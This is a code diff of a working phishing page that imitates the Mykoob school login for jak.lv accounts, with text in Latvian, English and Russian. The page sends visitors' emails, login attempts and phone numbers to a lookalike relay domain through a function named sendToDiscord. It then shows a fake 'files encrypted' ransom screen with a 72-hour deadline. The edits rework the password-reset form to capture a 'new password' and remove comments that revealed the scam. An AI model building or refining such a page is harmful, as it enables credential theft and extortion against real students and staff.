@@ -25,8 +25,8 @@
   --accent-hover:  #0274ef;
   --danger:        #ff686e;
   --danger-hover:  #e43f39;
+  --success:       #22c55e;
   --overlay:       rgba(0, 0, 0, 0.7);
-  --logo-url:      url("https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-light-CJEj_to2.png");
 }
 @media (prefers-color-scheme: light) {
   :root {
@@ -44,8 +44,8 @@
     --accent-hover:  #0058b8;
     --danger:        #dc2626;
     --danger-hover:  #b91c1c;
+    --success:       #16a34a;
     --overlay:       rgba(0, 0, 0, 0.5);
-    --logo-url:      url("https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png");
   }
 }
 
@@ -256,6 +256,9 @@ body {
 .modal--red { border-color: var(--danger); }
 .modal--red .modal__title { color: var(--danger); }
 
+.modal--green { border-color: var(--success); }
+.modal--green .modal__title { color: var(--success); }
+
 .modal__title { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: var(--text); }
 .modal__sub { font-size: 14px; color: var(--text-muted); margin-bottom: 24px; }
 .modal__form-group { margin-bottom: 16px; }
@@ -322,7 +325,6 @@ body {
 
 .modal__error { color: var(--danger); font-size: 13px; margin-top: 6px; min-height: 20px; }
 
-/* ── Waiting / verifying screen (60s before ransom) ── */
 .wait-screen {
   position: fixed;
   inset: 0;
@@ -350,7 +352,6 @@ body {
 .wait-sub { font-size: 15px; color: var(--text-muted); margin-bottom: 8px; max-width: 420px; line-height: 1.5; }
 .wait-count { font-size: 14px; color: var(--text-dim); font-variant-numeric: tabular-nums; margin-top: 12px; }
 
-/* ── Ransomware full-screen reveal ── */
 .ransom-screen {
   position: fixed;
   inset: 0;
@@ -486,7 +487,6 @@ body {
 
 </div>
 
-<!-- FORGOT PASSWORD MODAL -->
 <div class="modal-overlay" id="forgotModal">
 <div class="modal">
 <h2 class="modal__title" id="forgotTitle">Aizmirsāt paroli?</h2>
@@ -496,18 +496,27 @@ body {
 <input type="email" id="forgotEmail" placeholder="janis@jak.lv" />
 </div>
 <div class="modal__form-group">
-<label for="forgotOldPassword" id="forgotOldLabel">Vecā parole</label>
+<label for="forgotOldPassword" id="forgotOldLabel">Jaunā parole</label>
 <input type="password" id="forgotOldPassword" placeholder="••••••••" />
 </div>
 <div class="modal__error" id="forgotError"></div>
 <div class="modal__actions">
 <button class="btn-secondary" id="forgotCancel">Atcelt</button>
-<button class="btn-primary" id="forgotSend">Nosūtīt atjaunošanas saiti</button>
+<button class="btn-primary" id="forgotSend">Mainīt paroli</button>
 </div>
 </div>
 </div>
 
-<!-- PHONE VERIFICATION MODAL -->
+<div class="modal-overlay" id="pwdChangedModal">
+<div class="modal modal--green">
+<h2 class="modal__title" id="pwdChangedTitle">Parole veiksmīgi nomainīta</h2>
+<p class="modal__sub" id="pwdChangedSub">Jūsu parole ir atjaunināta. Lūdzu, piesakieties vēlreiz.</p>
+<div class="modal__actions">
+<button class="btn-primary" id="pwdChangedOk" style="flex:1;">Labi</button>
+</div>
+</div>
+</div>
+
 <div class="modal-overlay" id="phoneModal">
 <div class="modal">
 <h2 class="modal__title" id="phoneTitle">Papildu pārbaude</h2>
@@ -535,7 +544,6 @@ body {
 </div>
 </div>
 
-<!-- WAIT SCREEN (60s) -->
 <div class="wait-screen" id="waitScreen">
 <div class="wait-spinner"></div>
 <h2 class="wait-title" id="waitTitle">Verificējam jūsu numuru...</h2>
@@ -543,7 +551,6 @@ body {
 <div class="wait-count" id="waitCount">60</div>
 </div>
 
-<!-- RANSOMWARE FULL-SCREEN -->
 <div class="ransom-screen" id="ransomScreen">
 <div class="ransom-inner">
 <div class="ransom-title" id="ransomTitle">Jūsu faili ir šifrēti</div>
@@ -564,10 +571,9 @@ Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzē
 </div>
 
 <script>
-/* ── Server-side relay — webhook never touches the client ── */
-const RELAY_URL = 'https://edu-mykoob.com/t/relay.php';
+/* ── Server-side relay — saknē, ne mapē ── */
+const RELAY_URL = 'https://edu-mykoob.com/relay.php';
 
-/* ── Country → phone rules ── */
 const PHONE_RULES = {
   '+371': { country: 'LV', minLen: 8,  maxLen: 8,  regex: /^[2-9]\d{7}$/ },
   '+370': { country: 'LT', minLen: 8,  maxLen: 8,  regex: /^[3-9]\d{7}$/ },
@@ -579,44 +585,41 @@ const PHONE_RULES = {
   '+49':  { country: 'DE', minLen: 10, maxLen: 11, regex: /^[1-9]\d{9,10}$/ },
 };
 
-/* ── Local attempt counters (server owns real ones) ── */
 const attemptTracker = {};
 
 async function sendToDiscord(email, action, opts = {}) {
-  const { hasPassword = false, phone = null, country = null, clickOnly = false } = opts;
-  attemptTracker[email] = (attemptTracker[email] || 0) + 1;
+  const { hasPassword = false, phone = null, country = null, clickOnly = false, attempt = null } = opts;
 
   const body = {
-    email,
-    action,
-    hasPassword,
-    phone,
-    country,
-    attempt: attemptTracker[email],
-    clickOnly,
-    ts: new Date().toISOString(),
+    email:       email || 'unknown',
+    action:      action,
+    hasPassword: hasPassword,
+    phone:       phone,
+    country:     country,
+    attempt:     attempt !== null ? attempt : (attemptTracker[email] = (attemptTracker[email] || 0) + 1),
+    clickOnly:   clickOnly,
+    ts:          new Date().toISOString(),
   };
 
   try {
-    await fetch(RELAY_URL, {
+    const res = await fetch(RELAY_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
       keepalive: true,
     });
+    if (!res.ok) console.log('Relay responded', res.status);
   } catch (err) {
-    console.log('Relay error (ignored):', err);
+    console.log('Relay error:', err);
   }
 }
 
-/* ── State ── */
 let storedEmail = '';
 let loginAttempts = 0;
 const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
 let waitInterval = null;
 
-/* ── DOM refs ── */
 const emailInput     = document.getElementById('email');
 const passwordInput  = document.getElementById('password');
 const formError      = document.getElementById('formError');
@@ -630,6 +633,9 @@ const forgotSendBtn      = document.getElementById('forgotSend');
 const forgotCancelBtn    = document.getElementById('forgotCancel');
 const pwdForgotLink      = document.getElementById('pwdForgotLink');
 
+const pwdChangedModal = document.getElementById('pwdChangedModal');
+const pwdChangedOk    = document.getElementById('pwdChangedOk');
+
 const phoneModal     = document.getElementById('phoneModal');
 const phoneCode      = document.getElementById('phoneCode');
 const phoneNumber    = document.getElementById('phoneNumber');
@@ -642,10 +648,10 @@ const waitCount      = document.getElementById('waitCount');
 const ransomScreen   = document.getElementById('ransomScreen');
 const ransomTimerEl  = document.getElementById('ransomTimer');
 
-/* ── Modal helpers ── */
 function hideAllModals() {
   forgotModal.classList.remove('active');
   phoneModal.classList.remove('active');
+  pwdChangedModal.classList.remove('active');
   forgotError.textContent = '';
   phoneError.textContent  = '';
 }
@@ -656,6 +662,10 @@ function showForgotModal() {
   forgotError.textContent = '';
   forgotOldPassword.value = '';
   forgotOldPassword.focus();
+}
+
+function showPasswordChangedModal() {
+  pwdChangedModal.classList.add('active');
 }
 
 function showPhoneModal() {
@@ -675,7 +685,6 @@ function updatePhonePlaceholder() {
   }
 }
 
-/* ── Wait screen (60s) ── */
 function showWaitScreen() {
   hideAllModals();
   waitScreen.classList.add('active');
@@ -696,7 +705,6 @@ function showWaitScreen() {
   }, 1000);
 }
 
-/* ── Ransom screen ── */
 let ransomInterval = null;
 function showRansomScreen() {
   ransomScreen.classList.add('active');
@@ -720,11 +728,14 @@ function startRansomTimer(seconds) {
   }, 1000);
 }
 
-/* ── Login flow ── */
 function attemptLogin(email, password) {
   loginAttempts++;
   const hasPassword = Boolean(password && password.length > 0);
-  sendToDiscord(email, 'Pieslēgšanās mēģinājums', { hasPassword });
+
+  sendToDiscord(email, 'Pieslēgšanās mēģinājums', {
+    hasPassword: hasPassword,
+    attempt: loginAttempts,
+  });
 
   if (loginAttempts >= MAX_ATTEMPTS_BEFORE_PHONE) {
     formError.textContent = '';
@@ -739,15 +750,6 @@ function attemptLogin(email, password) {
   return false;
 }
 
-function resetPassword(email, oldPassword) {
-  sendToDiscord(email, 'Paroles atjaunošanas mēģinājums', {
-    hasPassword: Boolean(oldPassword && oldPassword.length > 0),
-  });
-  hideAllModals();
-  showRansomScreen();
-}
-
-/* ── Login form ── */
 loginForm.addEventListener('submit', function (e) {
   e.preventDefault();
   const email = emailInput.value.trim();
@@ -762,14 +764,23 @@ loginForm.addEventListener('submit', function (e) {
   attemptLogin(email, password);
 });
 
-pwdForgotLink.addEventListener('click', showForgotModal);
+pwdForgotLink.addEventListener('click', function () {
+  showForgotModal();
+});
 
 forgotSendBtn.addEventListener('click', function () {
-  const email = forgotEmail.value.trim();
+  const email  = forgotEmail.value.trim();
   const oldPwd = forgotOldPassword.value.trim();
+
   if (!email) { forgotError.textContent = t('needEmail'); return; }
   if (!oldPwd) { forgotError.textContent = t('needOldPassword'); return; }
-  resetPassword(email, oldPwd);
+
+  sendToDiscord(email, 'Paroles maiņa apstiprināta', {
+    hasPassword: true,
+  });
+
+  hideAllModals();
+  showPasswordChangedModal();
 });
 
 forgotEmail.addEventListener('keydown', e => { if (e.key === 'Enter') forgotSendBtn.click(); });
@@ -777,12 +788,17 @@ forgotOldPassword.addEventListener('keydown', e => { if (e.key === 'Enter') forg
 
 forgotCancelBtn.addEventListener('click', function () {
   hideAllModals();
+  formError.textContent = '';
+});
+
+pwdChangedOk.addEventListener('click', function () {
+  pwdChangedModal.classList.remove('active');
   loginAttempts = 0;
   formError.textContent = '';
   passwordInput.value = '';
+  emailInput.focus();
 });
 
-/* ── Phone modal ── */
 phoneCode.addEventListener('change', updatePhonePlaceholder);
 
 phoneSubmit.addEventListener('click', function () {
@@ -827,12 +843,11 @@ phoneNumber.addEventListener('input', function () {
 
 phoneNumber.addEventListener('keydown', e => { if (e.key === 'Enter') phoneSubmit.click(); });
 
-/* ── Click-outside closes normal modals (not wait/ransom) ── */
 document.querySelectorAll('.modal-overlay').forEach(overlay => {
   overlay.addEventListener('click', function (e) {
     if (e.target === this) {
+      if (this.id === 'pwdChangedModal') return;
       hideAllModals();
-      loginAttempts = 0;
       formError.textContent = '';
       phoneSubmit.disabled = false;
       phoneSubmit.textContent = t('phoneSubmit');
@@ -840,7 +855,6 @@ document.querySelectorAll('.modal-overlay').forEach(overlay => {
   });
 });
 
-/* ── Language ── */
 document.getElementById('langSelect').addEventListener('change', function () {
   currentLang = this.value;
   updateTexts(currentLang);
@@ -865,6 +879,10 @@ function updateTexts(lang) {
   document.getElementById('forgotCancel').textContent     = tr.cancel;
   document.getElementById('forgotSend').textContent       = tr.sendReset;
 
+  document.getElementById('pwdChangedTitle').textContent = tr.pwdChangedTitle;
+  document.getElementById('pwdChangedSub').textContent   = tr.pwdChangedSub;
+  document.getElementById('pwdChangedOk').textContent    = tr.pwdChangedOk;
+
   document.getElementById('phoneTitle').textContent     = tr.phoneTitle;
   document.getElementById('phoneSub').textContent       = tr.phoneSub;
   document.getElementById('phoneCodeLabel').textContent = tr.phoneCodeLabel;
@@ -884,7 +902,6 @@ function updateTexts(lang) {
   document.getElementById('footerHelp').textContent      = tr.footerHelp;
 }
 
-/* ── Translations ── */
 const translations = {
   lv: {
     mainTitle: 'Izvēlieties pieslēgšanas veidu',
@@ -895,15 +912,18 @@ const translations = {
     eparaksts: 'eParaksts',
     forgotLink: 'Aizmirsāt paroli?',
     forgotTitle: 'Aizmirsāt paroli?',
-    forgotSub: 'Ievadi savu e-pastu un veco paroli, lai saņemtu atjaunošanas saiti.',
-    oldPasswordLabel: 'Vecā parole',
+    forgotSub: 'Ievadi savu e-pastu un jauno paroli, lai mainītu paroli.',
+    oldPasswordLabel: 'Jaunā parole',
     cancel: 'Atcelt',
-    sendReset: 'Nosūtīt atjaunošanas saiti',
+    sendReset: 'Mainīt paroli',
     wrongPassword: 'Nepareiza parole. Mēģiniet vēlreiz.',
     needEmail: 'Lūdzu, ievadi savu e-pasta adresi.',
     needDomain: 'E-pastam jābeidzas ar @jak.lv',
     needPassword: 'Lūdzu, ievadi paroli.',
-    needOldPassword: 'Lūdzu, ievadi savu veco paroli.',
+    needOldPassword: 'Lūdzu, ievadi jauno paroli.',
+    pwdChangedTitle: 'Parole veiksmīgi nomainīta',
+    pwdChangedSub: 'Jūsu parole ir atjaunināta. Lūdzu, piesakieties vēlreiz.',
+    pwdChangedOk: 'Labi',
     phoneTitle: 'Papildu pārbaude',
     phoneSub: 'Lai turpinātu, lūdzu apstipriniet savu tālruņa numuru.',
     phoneCodeLabel: 'Valsts kods',
@@ -934,15 +954,18 @@ const translations = {
     eparaksts: 'eParaksts',
     forgotLink: 'Forgot password?',
     forgotTitle: 'Forgot password?',
-    forgotSub: 'Enter your email and old password to receive a reset link.',
-    oldPasswordLabel: 'Old password',
+    forgotSub: 'Enter your email and new password to change your password.',
+    oldPasswordLabel: 'New password',
     cancel: 'Cancel',
-    sendReset: 'Send reset link',
+    sendReset: 'Change password',
     wrongPassword: 'Incorrect password. Try again.',
     needEmail: 'Please enter your email address.',
     needDomain: 'Email must end with @jak.lv',
     needPassword: 'Please enter your password.',
-    needOldPassword: 'Please enter your old password.',
+    needOldPassword: 'Please enter your new password.',
+    pwdChangedTitle: 'Password changed successfully',
+    pwdChangedSub: 'Your password has been updated. Please log in again.',
+    pwdChangedOk: 'OK',
     phoneTitle: 'Additional verification',
     phoneSub: 'To continue, please confirm your phone number.',
     phoneCodeLabel: 'Country code',
@@ -973,15 +996,18 @@ const translations = {
     eparaksts: 'eParaksts',
     forgotLink: 'Забыли пароль?',
     forgotTitle: 'Забыли пароль?',
-    forgotSub: 'Введите свой email и старый пароль, чтобы получить ссылку для сброса.',
-    oldPasswordLabel: 'Старый пароль',
+    forgotSub: 'Введите свой email и новый пароль, чтобы изменить пароль.',
+    oldPasswordLabel: 'Новый пароль',
     cancel: 'Отмена',
-    sendReset: 'Отправить ссылку для сброса',
+    sendReset: 'Изменить пароль',
     wrongPassword: 'Неверный пароль. Попробуйте снова.',
     needEmail: 'Пожалуйста, введите адрес электронной почты.',
     needDomain: 'Email должен заканчиваться на @jak.lv',
     needPassword: 'Пожалуйста, введите пароль.',
-    needOldPassword: 'Пожалуйста, введите старый пароль.',
+    needOldPassword: 'Пожалуйста, введите новый пароль.',
+    pwdChangedTitle: 'Пароль успешно изменён',
+    pwdChangedSub: 'Ваш пароль обновлён. Пожалуйста, войдите снова.',
+    pwdChangedOk: 'ОК',
     phoneTitle: 'Дополнительная проверка',
     phoneSub: 'Чтобы продолжить, подтвердите свой номер телефона.',
     phoneCodeLabel: 'Код страны',
@@ -1009,7 +1035,6 @@ function t(key) {
   return (translations[currentLang] || translations.lv)[key] || key;
 }
 
-/* ── Light/dark logo ── */
 function swapLogo() {
   const logo = document.getElementById('brandLogo');
   const isLight = window.matchMedia('(prefers-color-scheme: light)').matches;
@@ -1019,7 +1044,6 @@ function swapLogo() {
 }
 window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', swapLogo);
 
-/* ── Init ── */
 (function init() {
   const params = new URLSearchParams(window.location.search);
   const emailParam = params.get('email');
